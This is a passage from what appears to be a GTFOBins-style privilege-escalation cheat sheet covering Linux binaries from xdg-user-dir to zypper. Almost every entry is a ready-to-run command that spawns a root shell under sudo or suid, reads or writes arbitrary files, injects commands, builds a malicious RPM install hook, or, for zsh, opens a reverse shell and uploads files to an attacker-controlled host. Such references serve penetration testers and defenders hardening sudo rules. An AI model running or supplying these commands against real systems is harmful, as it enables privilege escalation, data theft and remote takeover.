The current implementation of `xdg-user-dir` is basically `eval echo \${XDG_${1}_DIR:-$HOME}`, thus is can be easily used to achieve command execution.

### xdg-user-dir shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / unprivileged"
xdg-user-dir '}; /bin/sh #'
```
<!-- cheat
-->

## xdotool

This requires a running X server.

### xdotool shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
xdotool exec --sync /bin/sh
```
<!-- cheat
-->

#### xdotool shell - suid override

```sh title:"suid variant"
xdotool exec --sync /bin/sh -p
```
<!-- cheat
-->

## xelatex

Alias of [latex](#latex). All techniques from `latex` apply.

## xetex

Alias of [tex](#tex). All techniques from `tex` apply.

## xmodmap

This requires a running X server.

### xmodmap file-read

The read file content is corrupted by error prints.

```sh title:"sudo / suid / unprivileged"
xmodmap -v $file_in
```
<!-- cheat
var file_in
-->

## xmore

This requires a running X server.

### xmore file-read

The file is displayed in a graphical window.

```sh title:"sudo / suid / unprivileged"
xmore $file_in
```
<!-- cheat
var file_in
-->

## xpad

This requires a running X server.

### xpad file-read

The file is displayed in a graphical window.

```sh title:"sudo / suid / unprivileged"
xpad -f $file_in
```
<!-- cheat
var file_in
-->

## xxd

### xxd file-read

Read the contents of an arbitrary file.

```sh title:"sudo / suid / unprivileged"
xxd $file_in | xxd -r
```
<!-- cheat
var file_in
-->

### xxd file-write

Write attacker-controlled data to an arbitrary path.

```sh title:"sudo / suid / unprivileged"
echo $data | xxd | xxd -r - $file_out
```
<!-- cheat
var data
var file_out
-->

## xz

### xz file-read

Read the contents of an arbitrary file.

```sh title:"sudo / suid / unprivileged"
xz -c $file_in | xz -d
```
<!-- cheat
var file_in
-->

## yarn

### yarn shell #1

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / unprivileged"
yarn exec /bin/sh
```
<!-- cheat
-->

### yarn shell #2

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / unprivileged"
echo '{"scripts": {"preinstall": "/bin/sh"}}' >package.json
yarn --cwd .
```
<!-- cheat
-->

### yarn shell #3

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / unprivileged"
echo '{"scripts": {"xxx": "/bin/sh"}}' >package.json
yarn --cwd . xxx
```
<!-- cheat
-->

## yash

### yash shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
yash
```
<!-- cheat
-->

## yelp

### yelp file-read

This spawns a graphical window containing the file content somehow corrupted by word wrapping.

```sh title:"sudo / unprivileged"
yelp man:$file_in
```
<!-- cheat
var file_in
-->

## yt-dlp

### yt-dlp shell

The URL must point to a valid YouTube video which will be actually downloaded.

```sh title:"sudo / unprivileged"
yt-dlp 'https://www.youtube.com/watch?v=xxxxxxxxxxx' --exec '/bin/sh #'
```
<!-- cheat
-->

## yum

### yum command

Generate the RPM package with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.  ``` echo $cmd_file >x.sh fpm -n x -s dir -t rpm -a all --before-install .x.sh . ```

```sh title:"sudo"
yum localinstall -y x-1.0-1.noarch.rpm
```
<!-- cheat
-->

### yum download

The file on the remote host must have the `.rpm` extension, but the content does not have to be an RPM file. The file will be downloaded to a randomly created directory in `/var/tmp/yum-root-xxxxxx/`.

```sh title:"sudo"
yum install $scheme://$lhost$file_in.rpm
```
<!-- cheat
import tun_ip
import scheme
var file_in
-->

### yum inherit (inherits from python)

This allows to run Python code (`...`).

```sh title:"sudo"
cat >$tmp_dir/x<<EOF
[main]
plugins=1
pluginpath=$tmp_dir/
pluginconfpath=$tmp_dir/
EOF

cat >$tmp_dir/y.conf<<EOF
[main]
enabled=1
EOF

cat >$tmp_dir/y.py<<EOF
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  ...
EOF

yum -c $tmp_dir/x --enableplugin=y
```
<!-- cheat
var tmp_dir
-->

## zathura

This requires a running X server.

### zathura shell

The interaction happens in a GUI window, while the shell is dropped in the terminal.

```sh title:"sudo / unprivileged"
zathura
:! /bin/sh -c 'exec /bin/sh 0<&1'
```
<!-- cheat
-->

## zcat

### zcat file-read

Read the contents of an arbitrary file.

```sh title:"sudo / unprivileged"
zcat -f $file_in
```
<!-- cheat
var file_in
-->

## zgrep

### zgrep file-read

Read the contents of an arbitrary file.

```sh title:"sudo / unprivileged"
grep '' $file_in
```
<!-- cheat
var file_in
-->

## zic

### zic command

This executes the command twice:  - `$cmd_file 0 xxx` - `$cmd_file 1 xxx`  Additionally the `Test` file is created.

```sh title:"sudo / suid / unprivileged"
echo 'Rule Jordan 0 1 xxx Jan lastSun 2 1:00d -' >$tmp_file
echo 'Zone Test 2:00 Jordan CE%sT' >>$tmp_file
zic -d . -y $cmd_file $tmp_file
```
<!-- cheat
var cmd_file
var tmp_file
-->

## zip

### zip shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
zip $tmp_file /etc/hosts -T -TT '/bin/sh #'
```
<!-- cheat
var tmp_file
-->

### zip file-read

Read the contents of an arbitrary file.

```sh title:"sudo / suid / unprivileged"
zip $tmp_file $file_in
unzip -p $tmp_file
```
<!-- cheat
var file_in
var tmp_file
-->

## zless

### zless inherit (inherits from less)

Inherit the capabilities of another binary by invoking it.

```sh title:"sudo / suid / unprivileged"
zless $file_in
```
<!-- cheat
var file_in
-->

## zsh

### zsh shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
zsh
```
<!-- cheat
-->

### zsh reverse-shell

Connect back to an attacker-controlled listener.

```sh title:"sudo / suid / unprivileged"
zsh -c 'zmodload zsh/net/tcp;ztcp $lhost $lport;zsh >&$REPLY 2>&$REPLY 0>&$REPLY'
```
<!-- cheat
import tun_ip
import lports
-->

### zsh file-read #1

Read the contents of an arbitrary file.

```sh title:"sudo / suid / unprivileged"
zsh -c 'echo "$(<$file_in)"'
```
<!-- cheat
var file_in
-->

### zsh file-read #2

This spawns a pager if run in a TTY.

```sh title:"sudo / suid / unprivileged"
zsh -c '<$file_in'
```
<!-- cheat
var file_in
-->

### zsh file-write

Write attacker-controlled data to an arbitrary path.

```sh title:"sudo / suid / unprivileged"
zsh -c 'echo $data >$file_out'
```
<!-- cheat
var data
var file_out
-->

### zsh download

Pull a remote file to disk.

```sh title:"sudo / suid / unprivileged"
zsh -c 'zmodload zsh/net/tcp;ztcp $lhost $lport;echo -n "$(<&$REPLY)" >$file_out'
```
<!-- cheat
import tun_ip
import lports
var file_out
-->

### zsh upload

Push a local file to a remote receiver.

```sh title:"sudo / suid / unprivileged"
zsh -c 'zmodload zsh/net/tcp;ztcp $lhost $lport;echo -n "$(<$file_in)" >&$REPLY'
```
<!-- cheat
import tun_ip
import lports
var file_in
-->

### zsh inherit (inherits from less)

Inherit the capabilities of another binary by invoking it.

```sh title:"sudo / suid / unprivileged"
zsh -c '</etc/hosts'
```
<!-- cheat
-->

## zsoelim

### zsoelim file-read

The content is actually parsed and corrupted by the command.

```sh title:"sudo / suid / unprivileged"
zsoelim $file_in
```
<!-- cheat
var file_in
-->

## zypper

### zypper shell #1

The copy usually requires elevated privileges.

```sh title:"sudo / unprivileged"
cp /bin/sh /usr/lib/zypper/commands/zypper-x
zypper x
```
<!-- cheat
-->

### zypper shell #2

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / unprivileged"
cp /bin/sh $tmp_dir/zypper-x
PATH=$PATH:$tmp_dir/ zypper x
```
<!-- cheat
var tmp_dir
-->
